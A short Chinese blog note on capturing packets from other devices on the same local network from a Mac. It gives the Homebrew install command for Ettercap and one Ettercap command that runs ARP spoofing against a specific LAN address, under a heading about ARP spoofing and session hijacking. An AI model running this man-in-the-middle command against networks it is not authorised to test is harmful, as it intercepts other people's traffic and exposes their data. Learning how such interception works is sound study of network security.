---
title: Mac使用WireShark和Ettercap抓同一局域网设备数据包
date: 2022-02-24 09:17:24
tags:
---

## **安装Ettercap**

```bash
$ brew install ettercap
```


## 使用Ettercap进行arp欺骗与回话劫持

```bash
sudo ettercap -Tqi en0 -M arp:remote /192.168.50.212//  -l /tmp/log
```
